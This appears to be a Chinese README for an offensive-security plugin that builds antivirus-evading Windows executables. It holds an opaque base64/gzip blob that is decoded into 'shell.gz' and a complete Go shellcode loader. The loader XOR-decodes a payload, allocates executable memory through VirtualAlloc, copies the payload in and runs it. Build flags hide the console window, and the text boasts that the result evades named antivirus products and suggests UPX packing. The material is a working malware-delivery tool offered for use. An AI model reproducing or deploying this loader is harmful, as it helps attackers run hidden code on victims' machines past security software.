# 前言
仅用于技术交流，请勿用于非法用途

这个插件没有什么技术含量，旨在用于快速生成免杀的可执行文件，目前仅支持exe文件格式。需要安装go环境，因为是用`go build`生成的

```
echo H4sIAAAAAAAACr1TUW/aMBB+xr/iFiHkrFGasu2lGw+IelVVsiJg3aaKRVliqFVjR05SgRj/fecEAmzt66wots/fd77v7pzFyVO84LCMhSKkvbm++8LG/SnbkvPzhb5ccMVNXHDIH7mUhIhlpk0BlLScfJ0nsZQOLkuVx3NuV4VY4uwSkmiVV7iQhdHgLgxvpnA8ehCsLoIgqAFjNmHje/Y3oFsBRv1rFrHvbPB1yhDZv/o2vpmyCvAej2/Zj+gC/hk9aG+qo20N6b4O6W5txM+xsfE+caO4fNfdQ3Yy/bDMi6GO06vhkDp7kJ9iAlzSUgUujvy+SKpAe8a9MEUZy76UOrGMxqOlfBYqHRmdUOcYZmnjQg50tg75Ups10mqfpxzEhPqZ1xgkobZ5qZKqxNSFDWm1N1U5E51yzI4V3uzhYfZrXXDSmmsDAi4xyx9x/gSSK7rSJmqQLtrPzqy71oHdgzjLuEppY/LghPUgZj+rslT/LkrCCOI0NR5EHnBj7JXHqv0BJpIGHpRCFVlhqA3kEITrwaHDfh/1kgcv9w3eKObVRW8wfUJCp2N3PjNGG0wPWp3pIwed2cYXWkGil5nkBU8hL5OE5/m8lHLtO7X0XaXZShQ0qOVEjZYenBSs1lKrpTs9Lq1fjz/SaOCGdg65CmZW3yvC/4MQ+5r9ieQ8ox/gLdRbjk87xfM9YVLPO1lB87lk+weKv0dCXQQAAA==|base64 -D > shell.gz


gunzip shell.gz
```

## main.go

```
${KEY_1}

${KEY_2}

${shellcode}

${GONERATE}
$build = "//go:generate -command shell bash -c \"GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go\"";
//go:generate -command shell bash -c "GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go"

```

```
package main

${GONERATE}
//go:generate shell

import (
	"syscall"
	"unsafe"
	"time"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = ${KEY_1}
	KEY_2                  = ${KEY_2}
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func main() {
	${shellcode}
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
```


免杀效果如下图：

![img](./img/2.png)

用法：导入之后，位置在：`attack` -> `BypassAV`，快捷键：`Ctrl+G`

![img](./img/3.gif)

## 2020/7/19更新

更新了弹出的黑窗口问题和Linux/Mac上不能生成问题以及修复一些bug，建议生成64位的，32位的vt上查杀有点多（不过360全家桶、火绒那些还是可以过的）

**注：** 用go打包体积可能会有点大（1.2M左右），可以用upx压缩一下，大概能压缩到600kb左右那样子
